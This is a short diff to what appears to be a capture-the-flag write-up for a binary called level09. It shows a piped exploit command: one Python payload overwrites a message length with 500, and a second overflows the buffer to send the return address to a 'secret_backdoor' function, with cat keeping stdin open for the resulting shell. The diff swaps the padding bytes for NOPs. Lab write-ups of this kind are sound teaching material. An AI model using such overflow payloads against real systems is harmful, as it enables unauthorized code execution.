@@ -52,7 +52,7 @@ Use your own address if it differs.
 # Example with secret_backdoor = 0x000055555555488c
 (
   python -c "print('A'*40 + '\xf4\x01\x00\x00')";              # Stage 1: msg_len = 500
-  python -c "print('B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')";  # Stage 2: smash RET
+  python -c "print('\x90'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')";  # Stage 2: smash RET
   cat                                                     # keep stdin open for backdoor
 ) | ./level09
 ```
